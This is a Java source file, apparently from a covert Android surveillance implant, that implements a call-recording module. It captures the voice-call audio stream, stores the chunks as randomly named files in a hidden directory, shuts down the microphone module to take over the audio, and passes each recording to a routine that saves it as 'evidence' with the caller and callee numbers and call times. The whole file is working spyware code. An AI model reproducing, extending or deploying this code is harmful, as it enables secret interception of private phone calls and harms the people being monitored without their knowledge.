package com.android.dvci.module.call;

import java.io.IOException;
import java.util.Date;
import java.util.concurrent.TimeUnit;

import android.media.MediaRecorder;

import com.android.dvci.Call;
import com.android.dvci.Device;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.module.ModuleCall;
import com.android.dvci.module.ModuleMic;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Execute;
import com.android.dvci.util.Utils;
import com.android.mm.M;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;

public class RecordCall implements OnErrorListener, OnInfoListener {
	private static final String TAG = "RecordCall";
	private static final long MAX_FILE_SIZE = 1024 * 50;//50KB
	static RecordCall singleton;
	protected static final int CALL_PHONE = 0x0145;
	private static int MAX_NUM_OF_FAILURE = 10;


	private AutoFile onGoing_chunk;
	private Call call;
	private boolean incoming;
	private boolean recorder_started=false;


	private int numFailures=0;

	public synchronized static RecordCall self() {
		if (singleton == null) {
			singleton = new RecordCall();
		}

		return singleton;
	}
	
	private MediaRecorder recorder = null;

	private void createFile() {
		if (onGoing_chunk == null) {
			//onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + ".3gpp");
			onGoing_chunk = new AutoFile(Path.hidden(), Math.abs(Utils.getRandom()) + "");
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createFile) new file: " + onGoing_chunk.getFile());//$NON-NLS-1$
			}
		}
	}

	private void deleteFile() {
		if (onGoing_chunk != null && onGoing_chunk.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteFile) delete file: " + onGoing_chunk.getFile());//$NON-NLS-1$
			}
			onGoing_chunk.delete();
		}
		onGoing_chunk = null;
	}


	private boolean startRecord() {
		boolean firstTime = false;
		if (Cfg.DEBUG) {
			Check.log(TAG + M.e(" startRecord"));
		}
		if (recorder == null) {
			recorder = new MediaRecorder();
			firstTime = true;
		}else {
			if (recorder_started) {
				if (Cfg.DEBUG) {
					Check.log(TAG + M.e(" startRecord already running..."));
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + M.e("...nothing to do"));
				}
				return true;
			}
		}

		recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
		//recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setMaxFileSize(MAX_FILE_SIZE);
		createFile();
		recorder.setOutputFile(this.onGoing_chunk.getFilename());
		try {
			this.recorder.prepare();
			this.recorder.start();
			recorder_started = true;
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + M.e(" failure to start"));
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}
			}
			return false;
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + M.e(" running ..."));
		}
		return true;
	}


	private boolean stopRecorder( ) {
		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
			}
			return false;
		}
		//Execute.execute("chmod 755 " +this.onGoing_chunk);
		recorder.setOnErrorListener(null);
		recorder.setOnInfoListener(null);
		try {
			if(recorder_started) {
				recorder.stop();
				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
				recorder_started = false;
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(ex);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopRecord) resetting recorder");
				numFailures += 1;
			}
		}finally {
			if (this.onGoing_chunk == null || !this.onGoing_chunk.exists()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence) Error: out_file not available");

				}
				numFailures += 1;
			} else {
				//String myNumber = Device.self().getPhoneNumber();
				ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete()?call.getTimeEnd():new Date(),
						onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
				//deleteFile();
				//saveRecorderEvidence();
			}
		}


		return true;
	}

	public boolean isSupported() {
		return true;
	}
	public boolean stopCall(){
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopCall) called");
		}
		try {
			stopRecorder();
			if (recorder != null) {
				recorder.release();
			}
			if (ModuleCall.isMicAvailable()) {
				ModuleMic.self().resetBlacklist();
			}
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + M.e(" (stopCall) failure to stop"));
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}
			}
		}finally {

			recorder = null;
			call = null;

		}
		return true;
	}

	public boolean recordCall( final Call call, final boolean incoming) {
		if(numFailures>MAX_NUM_OF_FAILURE){
			//module.recordFlag = false;
			return false;
		}

		if (this.recorder == null) {
			this.call = call;
			this.incoming = incoming;
			/*
			if (stopRecord()) {
				Object future = Status.getStpe().schedule(new Runnable() {
					public void run() {
						String myNumber = Device.self().getPhoneNumber();
						module.saveCallEvidence(call.getNumber(), myNumber, incoming, call.getTimeBegin(), call.getTimeEnd(),
								currentRecordFile, true, 1, CALL_PHONE);
					}
				}, 100, TimeUnit.MILLISECONDS);e
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
			}
			return true;
			*/
			if (ModuleCall.isMicAvailable()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (recordCall) can't register call because mic is on:stopping it");
				}
				ModuleMic.self().stop();
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
			}
		}
		if (startRecord() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): recording started on file: " + onGoing_chunk.getName()); //$NON-NLS-1$
			}

		}
		return true;
	}
	public void onInfo(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
		}
		/*
		After recording reaches the specified filesize, a notification will be sent to the MediaRecorder.OnInfoListener with a "what"
		code of MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED
		and recording will be stopped.
		Stopping happens asynchronously, there is no guarantee that the recorder will
		have stopped by the time the listener is notified.
		*/
		if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onInfo): max Size reached, saving file");//$NON-NLS-1$
			}
			stopRecorder();
			try {
				if(call!=null && !call.isComplete()) {
					startRecord();
				}
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onInfo): exception restarting Mic");//$NON-NLS-1$
				}
			}
		}
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
		}
		stopCall();
	}

}
